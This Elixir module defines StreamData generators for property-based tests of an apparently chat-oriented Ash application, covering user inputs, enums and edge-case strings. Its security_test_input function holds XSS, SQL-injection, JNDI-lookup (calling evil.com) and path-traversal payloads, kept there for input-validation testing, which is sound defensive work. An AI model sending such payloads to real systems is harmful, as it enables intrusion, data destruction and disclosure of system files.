defmodule Magus.PropertyGenerators do
  @moduledoc """
  StreamData generators for property-based testing.

  These generators create random valid data for testing Ash resource actions
  with a wide range of inputs.

  ## Usage

      defmodule MyPropertyTest do
        use Magus.ResourceCase
        use ExUnitProperties

        import Magus.PropertyGenerators

        property "accepts any valid message content" do
          check all content <- message_content() do
            # Test with random content
          end
        end
      end
  """

  use ExUnitProperties

  # ---------------------------------------------------------------------------
  # String Generators
  # ---------------------------------------------------------------------------

  @doc """
  Generates valid message content strings.

  Produces alphanumeric strings between 1 and 10,000 characters.
  """
  def message_content do
    StreamData.string(:alphanumeric, min_length: 1, max_length: 10_000)
  end

  @doc """
  Generates valid short text strings (like titles, names).

  Produces strings between 1 and 200 characters.
  """
  def short_text do
    StreamData.string(:alphanumeric, min_length: 1, max_length: 200)
  end

  @doc """
  Generates valid display names.

  Produces strings between 1 and 50 characters.
  """
  def display_name do
    StreamData.string(:alphanumeric, min_length: 1, max_length: 50)
  end

  @doc """
  Generates valid, unique email addresses.
  """
  def email do
    StreamData.bind(StreamData.string(:alphanumeric, min_length: 3, max_length: 20), fn name ->
      unique_id = "#{System.unique_integer([:positive, :monotonic])}-#{:rand.uniform(1_000_000)}"
      StreamData.constant("#{name}#{unique_id}@test.com")
    end)
  end

  @doc """
  Generates valid passwords (at least 8 characters).
  """
  def password do
    StreamData.string(:alphanumeric, min_length: 8, max_length: 64)
  end

  # ---------------------------------------------------------------------------
  # Enum Generators
  # ---------------------------------------------------------------------------

  @doc """
  Generates valid prompt types.
  """
  def prompt_type do
    StreamData.member_of([:system, :user])
  end

  @doc """
  Generates valid conversation/chat modes.
  """
  def chat_mode do
    StreamData.member_of([:chat, :search, :reasoning, :image_generation, :video_generation])
  end

  @doc """
  Generates valid message roles.
  """
  def message_role do
    StreamData.member_of([:user, :system, :agent, :tool])
  end

  @doc """
  Generates valid message sources.
  """
  def message_source do
    StreamData.member_of([:user, :agent, :system])
  end

  @doc """
  Generates valid conversation visibility options.
  """
  def visibility do
    StreamData.member_of([:invite_only, :public])
  end

  @doc """
  Generates valid member roles.
  """
  def member_role do
    StreamData.member_of([:owner, :member, :observer])
  end

  @doc """
  Generates valid language codes.
  """
  def language do
    StreamData.member_of([:en, :de])
  end

  # ---------------------------------------------------------------------------
  # Composite Generators
  # ---------------------------------------------------------------------------

  @doc """
  Generates a valid user registration input map.
  """
  def user_registration_input do
    StreamData.bind(email(), fn email ->
      StreamData.bind(password(), fn password ->
        StreamData.bind(
          StreamData.one_of([display_name(), StreamData.constant(nil)]),
          fn display_name ->
            StreamData.constant(%{
              email: email,
              password: password,
              password_confirmation: password,
              display_name: display_name,
              language: :en
            })
          end
        )
      end)
    end)
  end

  @doc """
  Generates a valid message input map.

  Note: You still need to provide conversation_id separately.
  """
  def message_input do
    StreamData.fixed_map(%{
      text: message_content(),
      mode: chat_mode()
    })
  end

  @doc """
  Generates a valid prompt input map.
  """
  def prompt_input do
    StreamData.fixed_map(%{
      name: short_text(),
      content: message_content(),
      type: prompt_type()
    })
  end

  @doc """
  Generates a valid conversation input map.
  """
  def conversation_input do
    StreamData.fixed_map(%{
      title: StreamData.one_of([short_text(), StreamData.constant(nil)]),
      chat_mode: chat_mode()
    })
  end

  @doc """
  Generates a valid folder input map.
  """
  def folder_input do
    StreamData.fixed_map(%{
      name: short_text()
    })
  end

  @doc """
  Generates a valid flow input map.
  """
  def flow_input do
    StreamData.fixed_map(%{
      name: short_text()
    })
  end

  # ---------------------------------------------------------------------------
  # Helper Generators
  # ---------------------------------------------------------------------------

  @doc """
  Generates a list of valid tag names.
  """
  def tag_names(opts \\ []) do
    min = Keyword.get(opts, :min, 0)
    max = Keyword.get(opts, :max, 5)

    StreamData.list_of(short_text(), min_length: min, max_length: max)
  end

  @doc """
  Generates a valid metadata map.
  """
  def metadata do
    StreamData.map_of(
      StreamData.atom(:alphanumeric),
      StreamData.one_of([
        StreamData.string(:alphanumeric),
        StreamData.integer(),
        StreamData.boolean()
      ]),
      max_length: 10
    )
  end

  @doc """
  Generates a valid UUID.
  """
  def uuid do
    StreamData.constant(Ash.UUIDv7.generate())
  end

  @doc """
  Generates a list of valid attachment UUIDs.
  """
  def attachments(opts \\ []) do
    max = Keyword.get(opts, :max, 5)
    StreamData.list_of(uuid(), max_length: max)
  end

  # ---------------------------------------------------------------------------
  # Boundary Testing Generators
  # ---------------------------------------------------------------------------

  @doc """
  Generates edge case strings for boundary testing.

  Includes: empty strings, single chars, very long strings, unicode, whitespace.
  """
  def edge_case_string do
    StreamData.one_of([
      StreamData.constant(""),
      StreamData.constant(" "),
      StreamData.constant("a"),
      StreamData.constant(String.duplicate("a", 10_000)),
      StreamData.constant("Hello\nWorld"),
      StreamData.constant("Hello\tWorld"),
      StreamData.constant("  leading and trailing  "),
      StreamData.constant("unicode: 你好 🎉 émojis"),
      # Normal strings
      StreamData.string(:printable, min_length: 1, max_length: 100)
    ])
  end

  @doc """
  Generates potentially problematic input for security testing.

  Note: These are for testing input validation, not for exploits.
  """
  def security_test_input do
    StreamData.one_of([
      StreamData.constant("<script>alert('xss')</script>"),
      StreamData.constant("'; DROP TABLE users; --"),
      StreamData.constant("{{template_injection}}"),
      StreamData.constant("${{jndi:ldap://evil.com}}"),
      StreamData.constant("../../../etc/passwd"),
      # Normal strings for baseline
      StreamData.string(:alphanumeric, min_length: 5, max_length: 50)
    ])
  end
end
